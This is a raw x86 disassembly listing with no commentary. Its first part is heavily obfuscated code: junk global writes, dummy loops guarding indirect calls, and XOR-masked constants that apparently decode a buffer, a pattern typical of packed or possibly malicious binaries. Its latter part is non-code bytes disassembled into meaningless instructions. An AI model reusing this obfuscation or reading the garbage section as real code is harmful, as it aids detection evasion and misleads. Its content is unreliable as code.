  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423988
  41c5ea:	push   0x4238ed
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423963
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42394e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a84
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0xd3d7ebdc
  41ccad:	sub    eax,0xfc97abe7
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx-0x3]
  41ccb9:	sbb    al,0x49
  41ccbb:	test   eax,0x24762168
  41ccc0:	call   0x5aacb9c5
  41ccc5:	xacquire xchg BYTE PTR [esi-0x7d],cl
  41ccc9:	push   ecx
  41ccca:	mov    ebp,0x2a58998d
  41cccf:	push   ebp
  41ccd0:	repz sub al,0x35
  41ccd3:	and    bl,BYTE PTR [eax-0x7d0c147a]
  41ccd9:	dec    edx
  41ccda:	sub    ecx,DWORD PTR [ecx+edx*4]
  41ccdd:	into   
  41ccde:	outs   dx,BYTE PTR ds:[esi]
  41ccdf:	xchg   edi,eax
  41cce0:	fisub  DWORD PTR [edx-0x5d909eef]
  41cce6:	ss sti 
  41cce8:	fiadd  WORD PTR ds:0x9d35a0ec
  41ccee:	mov    ds:0x6740132a,eax
  41ccf3:	add    DWORD PTR [edi+0x26],edx
  41ccf6:	outs   dx,BYTE PTR ds:[esi]
  41ccf7:	rcr    BYTE PTR [edx+ebx*2],0x2b
  41ccfb:	sbb    DWORD PTR [ecx-0x29],edi
  41ccfe:	or     edi,DWORD PTR [ecx+ebp*4]
  41cd01:	push   esp
  41cd02:	ss jmp 0xf85af94b
  41cd08:	ja     0x41cc9c
  41cd0a:	mov    BYTE PTR [edi],dl
  41cd0c:	xlat   BYTE PTR ds:[ebx]
  41cd0d:	cmp    al,0xa8
  41cd0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd10:	push   esi
  41cd11:	push   ss
  41cd12:	icebp  
  41cd13:	dec    ebp
  41cd14:	add    eax,ebx
  41cd16:	jb     0x41cd0c
  41cd18:	jne    0x41cce2
  41cd1a:	or     al,0x8f
  41cd1c:	cmp    DWORD PTR [ebp+0x417de383],esi
  41cd22:	fwait
  41cd23:	pusha  
  41cd24:	push   esp
  41cd25:	cld    
  41cd26:	pop    ebx
  41cd27:	adc    bl,BYTE PTR [ebp+0x37]
  41cd2a:	clc    
  41cd2b:	shl    DWORD PTR [edi+edx*8-0x722d5f0],cl
  41cd32:	jg     0x41cd2a
  41cd34:	fadd   st(0),st
  41cd36:	xchg   edi,eax
  41cd37:	sar    bl,0x7e
  41cd3a:	jp     0x41cd8a
  41cd3c:	push   ebx
  41cd3d:	outs   dx,DWORD PTR ds:[esi]
  41cd3e:	jle    0x41cd02
  41cd40:	test   eax,0xf25fcbdd
  41cd45:	scas   eax,DWORD PTR es:[edi]
  41cd46:	fs sahf 
  41cd48:	xchg   ebp,eax
  41cd49:	popf   
  41cd4a:	in     eax,dx
  41cd4b:	or     ch,ch
  41cd4d:	xchg   ecx,eax
  41cd4e:	gs int3 
  41cd50:	stc    
  41cd51:	out    0xd7,al
  41cd53:	pop    esi
  41cd54:	pop    esp
  41cd55:	mov    eax,eax
  41cd57:	rol    edx,0xae
  41cd5a:	push   ds
  41cd5b:	call   0x8baa06c0
  41cd60:	cmc    
  41cd61:	icebp  
  41cd62:	pop    ebp
  41cd63:	sub    al,0xe5
  41cd65:	test   DWORD PTR [eax],esp
  41cd67:	cmc    
  41cd68:	inc    ecx
  41cd69:	mov    esi,0xa9412202
  41cd6e:	(bad)
  41cd72:	aam    0xb7
  41cd74:	push   cs
  41cd75:	adc    ecx,DWORD PTR [eax-0x3e]
  41cd78:	mov    ecx,0x40fce3c3
  41cd7d:	dec    esp
  41cd7e:	push   ds
  41cd7f:	mov    eax,0x9c1be18c
  41cd84:	cli    
  41cd85:	cmp    eax,DWORD PTR [ecx+0x637e43ff]
  41cd8b:	inc    edi
  41cd8c:	ficomp DWORD PTR [ebx+0x68]
  41cd8f:	adc    dl,BYTE PTR [ebx]
  41cd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd92:	ret    
  41cd93:	jge    0x41cdf6
  41cd95:	ret    
  41cd96:	sub    edx,DWORD PTR [ecx-0x5e]
  41cd99:	add    DWORD PTR [edx-0x28f2daf6],edx
  41cd9f:	stos   DWORD PTR es:[edi],eax
  41cda0:	push   esp
  41cda1:	xchg   BYTE PTR [edx+0x66],ch
  41cda4:	pop    edx
  41cda5:	mov    esi,0x470e8aab
  41cdaa:	arpl   sp,dx
  41cdac:	mov    ds:0x4d9bd56c,eax
  41cdb1:	sub    ch,BYTE PTR [ebp-0x47]
  41cdb4:	mov    WORD PTR [ebp+0x4a],es
  41cdb7:	sbb    esi,edi
  41cdb9:	jmp    0xd00c1c2b
  41cdbe:	or     DWORD PTR [edx-0x20218cdd],esi
  41cdc4:	jb     0x41ce40
  41cdc6:	pop    edx
  41cdc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdc8:	call   0xe575b21a
  41cdcd:	pop    esi
  41cdce:	dec    eax
  41cdcf:	dec    esp
  41cdd0:	xlat   BYTE PTR ds:[ebx]
  41cdd1:	pusha  
  41cdd2:	mov    bl,0x40
  41cdd4:	cdq    
  41cdd5:	ja     0x41cde2
  41cdd7:	jge    0x41cdc2
  41cdd9:	test   dh,dh
  41cddb:	adc    dh,BYTE PTR [ebx]
  41cddd:	enter  0xa2d7,0x77
  41cde1:	and    esi,DWORD PTR [ecx*1-0x65111aac]
  41cde8:	(bad)  
  41cde9:	fwait
  41cdea:	dec    edi
  41cdeb:	lds    esp,FWORD PTR [edx+0x4f]
  41cdee:	jno    0x41ce17
  41cdf0:	mov    edx,0x3fd495b4
  41cdf5:	fbstp  TBYTE PTR [ebx+0x78]
  41cdf8:	jmp    0x41cdf3
  41cdfa:	push   ecx
  41cdfb:	push   ecx
  41cdfc:	push   0xffffffc8
  41cdfe:	lods   al,BYTE PTR ds:[esi]
  41cdff:	rol    DWORD PTR [esi+edx*4+0x2f],0x10
  41ce04:	and    al,0x42
  41ce06:	and    eax,0x1d2a9da3
  41ce0b:	inc    esp
  41ce0d:	lahf   
  41ce0e:	and    ebp,DWORD PTR [ebx-0xdc9b9a9]
  41ce14:	(bad)  
  41ce16:	ins    BYTE PTR es:[edi],dx
  41ce17:	fsub   DWORD PTR [ebx-0x73]
  41ce1a:	inc    esp
  41ce1b:	fisttp WORD PTR [esi+0x69]
  41ce1e:	adc    DWORD PTR [edx],ecx
  41ce20:	and    DWORD PTR [esi],edx
  41ce22:	mov    ah,0xaf
  41ce24:	loope  0x41ce5b
  41ce26:	addr16 icebp 
  41ce28:	lock lods eax,DWORD PTR ds:[esi]
  41ce2a:	xchg   ebx,eax
  41ce2b:	push   ebp
  41ce2c:	(bad)  
  41ce2d:	push   0x7
  41ce2f:	pusha  
  41ce30:	rcl    BYTE PTR [ebx],0xf6
  41ce33:	lods   eax,DWORD PTR ds:[esi]
  41ce34:	nop    ecx
  41ce37:	or     edi,esi
  41ce39:	add    BYTE PTR [edi+0x3beb51da],bh
  41ce3f:	ins    DWORD PTR es:[edi],dx
  41ce40:	popf   
  41ce41:	mov    dh,0x1
  41ce43:	fdiv   DWORD PTR [eax]
  41ce45:	sbb    ecx,edi
  41ce47:	mov    dh,0x87
  41ce49:	(bad)  
  41ce4a:	jecxz  0x41cec5
  41ce4c:	(bad)  [edi+ecx*2+0x637fff20]
  41ce53:	adc    eax,0xeeaa8eaf
  41ce58:	add    DWORD PTR ds:0xf7018694,eax
  41ce5e:	jle    0x41ce5b
  41ce60:	sub    BYTE PTR [ebx-0x64487040],0x7d
  41ce67:	out    dx,eax
  41ce68:	and    ecx,DWORD PTR [esp+esi*2]
  41ce6b:	addr16 cli 
  41ce6d:	cdq    
  41ce6e:	hlt    
  41ce6f:	rcl    BYTE PTR [ebx-0x33],cl
  41ce72:	std    
  41ce73:	mov    DWORD PTR [edi-0x49],edx
  41ce76:	or     ah,BYTE PTR [ebx+ecx*1]
  41ce79:	sbb    al,0x77
  41ce7b:	mov    al,ds:0x1147fe9a
  41ce80:	mov    cl,0x65
  41ce82:	mov    ds:0x141ad4e3,al
  41ce87:	jne    0x41ceb5
  41ce89:	js     0x41cec0
  41ce8b:	mov    DWORD PTR [eax+0x5e029f37],edi
  41ce91:	dec    edi
  41ce92:	jp     0x41ce4c
  41ce94:	enter  0x5843,0xe0
  41ce98:	push   ds
  41ce99:	mov    cl,0x40
  41ce9b:	cdq    
  41ce9c:	daa    
  41ce9d:	and    ecx,esi
  41ce9f:	xchg   ecx,eax
  41cea0:	push   ss
  41cea1:	aas    
  41cea2:	(bad)  
  41cea3:	out    dx,al
  41cea4:	ins    BYTE PTR es:[edi],dx
  41cea5:	pop    ebp
  41cea6:	sub    eax,0x7e5b02dd
  41ceab:	ss popf 
  41cead:	pop    edi
  41ceae:	jg     0x41cf22
  41ceb0:	add    dl,ah
  41ceb2:	leave  
  41ceb3:	(bad)  
  41ceb4:	mov    bl,0x30
  41ceb6:	in     eax,0xaf
  41ceb8:	pop    ebx
  41ceb9:	inc    esp
  41ceba:	lea    esi,[eax+0x3821933b]
